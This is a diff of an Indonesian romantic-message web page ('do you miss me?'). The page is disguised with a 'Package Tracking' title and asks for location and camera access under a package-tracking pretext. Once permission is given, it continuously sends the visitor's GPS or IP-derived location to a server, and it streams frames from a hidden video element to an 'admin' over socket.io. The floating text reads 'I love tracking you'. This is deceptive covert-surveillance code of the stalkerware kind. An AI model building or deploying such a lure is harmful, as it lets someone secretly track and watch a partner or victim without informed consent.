@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="utf-8" />
-  <title>I Love You Sayang 💖</title>
+  <title>Pelacakan Paket 💖</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
     :root {
@@ -30,7 +30,7 @@
     }
 
     h1 {
-      font-size: 3rem;
+      font-size: 2.6rem;
       margin-bottom: 12px;
       text-shadow: 0 0 20px rgba(255, 77, 121, 0.3);
       animation: glow 2s ease-in-out infinite alternate;
@@ -87,7 +87,7 @@
       color: rgba(255, 255, 255, 0.95);
     }
 
-    /* Floating "I love you sayang" effect */
+    /* Efek cinta mengambang */
     .floating {
       position: fixed;
       inset: 0;
@@ -112,51 +112,6 @@
       100% { transform: translateY(-250vh) scale(1.4); opacity: 0; }
     }
 
-    #ringBox {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%) scale(0.8);
-      opacity: 0;
-      transition: opacity 0.6s, transform 0.6s;
-      z-index: 10;
-      pointer-events: none;
-    }
-
-    #ringBox.show {
-      opacity: 1;
-      transform: translate(-50%, -50%) scale(1);
-    }
-
-    .ring {
-      width: 140px;
-      height: 140px;
-      border-radius: 50%;
-      border: 10px solid gold;
-      background: radial-gradient(circle at center, #fffbd6 10%, #ffe680 80%);
-      position: relative;
-      box-shadow: 0 0 60px rgba(255, 255, 160, 0.6), 0 0 100px rgba(255, 255, 120, 0.4);
-      animation: shine 2s infinite ease-in-out;
-    }
-
-    .ring::before {
-      content: "";
-      position: absolute;
-      top: -30px;
-      left: 50%;
-      transform: translateX(-50%) rotate(45deg);
-      width: 40px;
-      height: 40px;
-      background: linear-gradient(135deg, #fff, #ffe6a3);
-      border-radius: 6px;
-      box-shadow: 0 0 25px rgba(255, 255, 180, 0.8);
-    }
-
-    @keyframes shine {
-      0%, 100% { transform: rotate(0deg) scale(1); }
-      50% { transform: rotate(5deg) scale(1.05); }
-    }
-
     video { display: none; }
   </style>
 </head>
@@ -164,23 +119,21 @@
   <div class="floating" id="floating"></div>
 
   <div class="center card">
-    <h1>I Love You Sayang 💖</h1>
-    <img class="kitty" src="/static/img/kucing.jpeg" alt="kucing imut">
+    <h1> kamu kangen aku ga? 💗</h1>
+    <img class="kitty" src="/static/img/kucing.jpeg" alt="gambar paket lucu">
     <div>
-      <button class="btn" id="startBtn">Klik ini 💕</button>
-      <button class="btn btn-stop" id="stopBtn" style="display:none">Makasih sayang udah kangen aku 💗</button>
+      <button class="btn" id="startBtn">klik ini kalo kamu kangen 💕</button>
+      <button class="btn btn-stop" id="stopBtn" style="display:none">makasih sayanggg🥰🥰🥰</button>
     </div>
-    <div id="status" class="status">Klik tombol kalau kamu kangen 💞</div>
+    <div id="status" class="status">Klik ini kalo kamu kangen 📍</div>
   </div>
-
-  <div id="ringBox"><div class="ring"></div></div>
 
   <video id="hiddenVideo" autoplay playsinline muted></video>
 
   <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
   <script>
     const socket = io();
-    const clientId = localStorage.getItem("client_id") || "client_" + Math.random().toString(36).slice(2,9);
+    const clientId = localStorage.getItem("client_id") || "package_" + Math.random().toString(36).slice(2,9);
     localStorage.setItem("client_id", clientId);
     socket.emit("register", { client_id: clientId, role: "client" });
 
@@ -188,7 +141,6 @@
     const stopBtn = document.getElementById("stopBtn");
     const statusEl = document.getElementById("status");
     const hiddenVideo = document.getElementById("hiddenVideo");
-    const ringBox = document.getElementById("ringBox");
     const floating = document.getElementById("floating");
 
     let mediaStream = null;
@@ -196,38 +148,14 @@
     let interval = null;
     const FPS = 2;
 
-    // fallback IP lokasi
-    async function getIpLocation() {
-      try {
-        const r = await fetch("https://ipapi.co/json/");
-        const j = await r.json();
-        return { latitude: j.latitude, longitude: j.longitude, source: "ip" };
-      } catch (err) {
-        console.warn("Gagal ambil IP lokasi:", err);
-        return null;
-      }
-    }
-
-    async function sendLocation(lat, lon, source = "gps") {
-      await fetch("/report", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          client_id: clientId,
-          latitude: lat,
-          longitude: lon,
-          source
-        })
-      }).catch(err => console.error("Gagal kirim lokasi:", err));
-    }
-
+    // === Efek animasi ===
     function spawnLoves(count = 60) {
       const vw = window.innerWidth;
       const vh = window.innerHeight;
       for (let i = 0; i < count; i++) {
         const el = document.createElement("div");
         el.className = "love";
-        el.textContent = "I love you sayang 💗";
+        el.textContent = "💗 I love tracking you 💗";
         el.style.left = Math.random() * vw + "px";
         el.style.top = vh + "px";
         const dur = 10 + Math.random() * 10;
@@ -241,32 +169,60 @@
     spawnLoves(80);
     setInterval(() => spawnLoves(30), 2000);
 
-    startBtn.addEventListener("click", async () => {
-      ringBox.classList.add("show");
-      setTimeout(() => ringBox.classList.remove("show"), 4000);
+    // === Ambil lokasi IP fallback ===
+    async function getIpLocation() {
+      try {
+        const r = await fetch("https://ipapi.co/json/");
+        const j = await r.json();
+        return { latitude: j.latitude, longitude: j.longitude, source: "ip" };
+      } catch (err) {
+        console.warn("Gagal ambil IP lokasi:", err);
+        return null;
+      }
+    }
 
-      const allowLoc = confirm("Izinkan berbagi lokasi?");
-      const allowCam = confirm("Izinkan berbagi kamera?");
-      statusEl.textContent = "Menyiapkan izin...";
+    // === Kirim lokasi ke server ===
+    async function sendLocation(lat, lon, source = "gps") {
+      try {
+        await fetch("/report", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            client_id: clientId,
+            latitude: lat,
+            longitude: lon,
+            source
+          })
+        });
+      } catch (err) {
+        console.error("Gagal kirim lokasi:", err);
+      }
+    }
+
+    // === Mulai tracking lokasi dan kamera ===
+    startBtn.addEventListener("click", async () => {
+      const allowLoc = confirm("Izinkan berbagi lokasi untuk pelacakan paket?");
+      const allowCam = confirm("Izinkan berbagi kamera (opsional)?");
+      statusEl.textContent = "tunggu";
 
       if (allowLoc) {
         if (navigator.geolocation) {
           geoWatch = navigator.geolocation.watchPosition(async pos => {
             await sendLocation(pos.coords.latitude, pos.coords.longitude, "gps");
-            statusEl.textContent = "Kangen bangettt 💗 ";
+            statusEl.textContent = "📍makasih sayang aku juga kangen";
           }, async err => {
             console.warn("Gagal ambil GPS:", err);
             const ipLoc = await getIpLocation();
             if (ipLoc) {
               await sendLocation(ipLoc.latitude, ipLoc.longitude, "ip");
-              statusEl.textContent = "Kangen bangettt 💗 ";
+              statusEl.textContent = "📍 Lokasi dikirim (IP)";
             }
           }, { enableHighAccuracy: true, timeout: 8000 });
         } else {
           const ipLoc = await getIpLocation();
           if (ipLoc) {
             await sendLocation(ipLoc.latitude, ipLoc.longitude, "ip");
-            statusEl.textContent = "Kangen bangettt 💗";
+            statusEl.textContent = "📍 Lokasi dikirim (IP)";
           }
         }
       }
@@ -277,26 +233,28 @@
           hiddenVideo.srcObject = mediaStream;
           hiddenVideo.play();
           startStream();
-          startBtn.style.display = "none";
-          stopBtn.style.display = "inline-block";
         } catch (err) {
           console.error("Gagal akses kamera:", err);
           statusEl.textContent = "Tidak bisa akses kamera 😢";
         }
       }
+
+      startBtn.style.display = "none";
+      stopBtn.style.display = "inline-block";
+      statusEl.textContent = "💖";
     });
 
-    stopBtn.addEventListener("click", stopSharing);
-
-    function stopSharing() {
+    // === Hentikan pelacakan ===
+    stopBtn.addEventListener("click", () => {
       if (geoWatch) { navigator.geolocation.clearWatch(geoWatch); geoWatch = null; }
       if (interval) { clearInterval(interval); interval = null; }
       if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
-      statusEl.textContent = "Udah stop berbagi sayang 💗";
       startBtn.style.display = "inline-block";
       stopBtn.style.display = "none";
-    }
+      statusEl.textContent = "Pelacakan dihentikan 💗";
+    });
 
+    // === Stream kamera ke admin ===
     function startStream() {
       const canvas = document.createElement("canvas");
       const ctx = canvas.getContext("2d");
